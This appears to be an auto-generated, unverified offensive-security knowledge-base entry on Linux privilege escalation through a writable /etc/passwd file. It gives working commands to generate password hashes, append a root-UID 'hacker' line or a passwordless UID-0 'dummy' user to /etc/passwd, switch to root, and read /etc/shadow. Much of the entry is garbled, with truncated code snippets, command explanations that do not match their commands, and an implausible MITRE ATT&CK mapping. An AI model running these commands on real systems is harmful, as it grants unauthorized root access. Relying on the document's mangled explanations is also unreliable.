---
id: 04ce5396-2ebe-4288-a958-bf5fb58f3b3d
name: Linux - Privilege Escalation via Writable /etc/passwd
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:19.234434+00:00'
updated_at: '2023-04-10T20:34:31.920757+00:00'
tactics:
- '[[Collection|TA0009 - Collection]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Discovery|TA0007 - Discovery]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[Account Discovery|T1087 - Account Discovery]]'
- '[[Create Account|T1136 - Create Account]]'
- '[[Data from Information Repositories|T1213 - Data from Information Repositories]]'
- '[[Data from Local System|T1005 - Data from Local System]]'
- '[[XSL Script Processing|T1220 - XSL Script Processing]]'
tags:
- '[[Linux - Privilege Escalation]]'
- '[[Writable /etc/passwd]]'
- '[[Writable files]]'
commands:
- '[[Add Dummy User to /etc/passwd and Switch to Dummy User]]'
- '[[Login as hacker]]'
- '[[Password Hash]]'
- '[[Read Shadow File]]'
- '[[Switch to root user]]'
- '[[User Account Creation]]'
- '[[View list of users in /etc/passwd]]'
- '[[View Password Database]]'
---

# Linux - Privilege Escalation via Writable /etc/passwd

## Summary

A common technique for privilege escalation on Linux systems is to exploit writable files. One of the most commonly targeted files is /etc/passwd. Attackers can modify this file to create a new user with administrative privileges or modify the password hash of an existing user to gain access. The a

## Description

# Description

A common technique for privilege escalation on Linux systems is to exploit writable files. One of the most commonly targeted files is /etc/passwd. Attackers can modify this file to create a new user with administrative privileges or modify the password hash of an existing user to gain access. The attacker can then use this new account to execute commands with elevated privileges.

To exploit this vulnerability, the attacker must first gain write access to the /etc/passwd file. They can then use a variety of commands to modify the file, such as adding a new user or modifying the password hash of an existing user. The attacker can then use this new account to execute commands with elevated privileges.

This technique is valuable to attackers as it allows them to escalate privileges on a system and gain access to sensitive information or execute malicious commands with elevated privileges. However, it can be mitigated by ensuring that the /etc/passwd file is not writable by unauthorized users.

 

## Requirements

1. Write access to the /etc/passwd file

 

## Defense

1. Ensure that the /etc/passwd file is not writable by unauthorized users

1. Implement strict file permissions to prevent unauthorized modification of system files

1. Monitor system logs for suspicious activity related to the /etc/passwd file

 

## Objectives

1. Escalate privileges on a Linux system

1. Create a new user with administrative privileges

1. Modify the password hash of an existing user

 

# Instructions

1. To generate a password hash using these commands, follow these steps:
1. openssl passwd -1 -salt hacker hacker
This command generates a password hash using the MD5 algorithm with a salt of "hacker".
2. mkpasswd -m SHA-512 hacker
This command generates a password hash using the SHA-512 algorithm with a salt of random characters.
3. python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
This command generates a password hash using the SHA-512 algorithm with a salt of "salt".
Replace "hacker" with your desired password and "salt" with your desired salt.

 



**Code**: [[openssl passwd -1 -salt hacker hacker
mkpasswd -m ]]



> These commands are used to generate password hashes for use in various applications. Password hashing is the process of converting a password into a fixed-length string of characters, which can be stored in a database or file. When a user logs in, their password is hashed and compared to the stored hash. If the hashes match, the user is granted access. Password hashing is important for security because it ensures that even if an attacker gains access to the password database, they will not be able to easily determine the passwords of individual users.

2. useradd [options] [username]

 



**Code**: [[hacker]]



> This command is used to add a new user to the system. The options available with this command are:

-m, --create-home: This option creates a home directory for the new user.
-d, --home <directory>: This option specifies the home directory for the new user.
-g, --gid <group>: This option specifies the primary group for the new user.
-s, --shell <shell>: This option specifies the login shell for the new user.
-u, --uid <UID>: This option specifies the UID for the new user.

3. To generate a password for the hacker account, use the following command:

 



**Code**: [[hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/b]]



> The 'hacker' in the command refers to the username for which the password is being generated. The 'GENERATED_PASSWORD_HERE' field should be replaced with the actual password that is generated. The '0:0' fields represent the user and group ID respectively. '/root' represents the home directory for the user and '/bin/bash' is the default shell for the user. This command can be used to create a new user account with a generated password.



**Command** ([[User Account Creation]]):

```bash
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```



4. The 'hacker' password data represents a user account in a UNIX-like operating system. The data includes the username, encrypted password, user ID (UID), group ID (GID), user information, home directory, and default shell.

 



**Code**: [[hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker]]



> The password data is stored in the /etc/passwd file and is used to authenticate users when they log in to the system. The encrypted password field is generated using a one-way hash function and cannot be decrypted. The user ID and group ID are used to control access to system resources. The user information field typically includes the user's full name and contact information. The home directory is the default location where the user's files are stored, and the default shell is the command interpreter used by the user when they log in.



**Command** ([[Password Hash]]):

```bash
hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash
```



5. su [username]

 



**Code**: [[su]]



> The 'su' command is used to switch to another user account on the system. By default, if no username is provided, it will switch to the superuser account (root). If a username is provided, it will switch to that user's account. This command is often used to perform administrative tasks that require elevated privileges.



**Command** ([[Switch to root user]]):

```bash
su
```



6. Use this command to execute hacking related tasks.

 



**Code**: [[hacker:hacker]]



> This command requires expertise in ethical hacking and should only be used for legal and authorized purposes. The arguments of the command may vary depending on the specific task to be performed.



**Command** ([[Login as hacker]]):

```bash
hacker:hacker
```



7. To add a dummy user without a password, run the following command:

 



**Code**: [[echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
s]]



> This command adds a user named 'dummy' to the system without a password. The command first appends a line to the /etc/passwd file with the user information, and then switches to the 'dummy' user with the su command. Note that this command might degrade the security of the machine, as it creates a user without a password.



**Command** ([[Add Dummy User to /etc/passwd and Switch to Dummy User]]):

```bash
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```



8. To view user information on a BSD platform, use the following command:

 



**Code**: [[/etc/passwd]]



> The /etc/passwd file contains information about each user on the system. To view this information, use the 'cat' command followed by the path to the /etc/passwd file. This will display the contents of the file in the terminal. Alternatively, you can use the 'less' command to view the contents of the file one page at a time.



**Command** ([[View list of users in /etc/passwd]]):

```bash
/etc/passwd
```



9. To access the password database, use the appropriate command and provide the path to the database file.

 



**Code**: [[/etc/pwd.db]]



> The password database stores user account information, such as usernames and hashed passwords. This information is used for authentication purposes when users log in to the system. The location of the password database may vary depending on the operating system and configuration. It is important to ensure that the password database is properly secured and only accessible to authorized users.



**Command** ([[View Password Database]]):

```bash
/etc/pwd.db
```



10. grep command

 



**Code**: [[/etc/master.passwd]]



> The 'grep' command is used to search for a specific text pattern in a file. In this case, we are searching for the text ' and ' in the file '/etc/master.passwd'. The command syntax would be 'grep ' and ' /etc/master.passwd'

11. Use the following commands to access and modify the shadow file:

 



**Code**: [[/etc/shadow]]



> The shadow file contains encrypted password information for user accounts and is only accessible by the root user. To view the contents of the file, use the command 'sudo cat /etc/shadow'. To edit the file, use the command 'sudo vipw -s' which opens the file in a text editor. It is important to exercise caution when modifying this file as any errors can result in login issues for users.



**Command** ([[Read Shadow File]]):

```bash
/etc/shadow
```



12. mv /etc/spwd.db /new/path/to/spwd.db

 



**Code**: [[/etc/spwd.db]]



> This command renames the shadow password file located at /etc/spwd.db to a new path specified by the user. The new path can be any valid file path on the system. This command is useful when the administrator wants to move the shadow password file to a new location or rename it for security reasons.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection|TA0009 - Collection]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Discovery|TA0007 - Discovery]]
- [[Execution|TA0002 - Execution]]
- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[Account Discovery|T1087 - Account Discovery]]
- [[Create Account|T1136 - Create Account]]
- [[Data from Information Repositories|T1213 - Data from Information Repositories]]
- [[Data from Local System|T1005 - Data from Local System]]
- [[XSL Script Processing|T1220 - XSL Script Processing]]

## Commands Used

- [[Add Dummy User to /etc/passwd and Switch to Dummy User]]
- [[Login as hacker]]
- [[Password Hash]]
- [[Read Shadow File]]
- [[Switch to root user]]
- [[User Account Creation]]
- [[View list of users in /etc/passwd]]
- [[View Password Database]]

## Tags

- [[Linux - Privilege Escalation]]
- [[Writable /etc/passwd]]
- [[Writable files]]


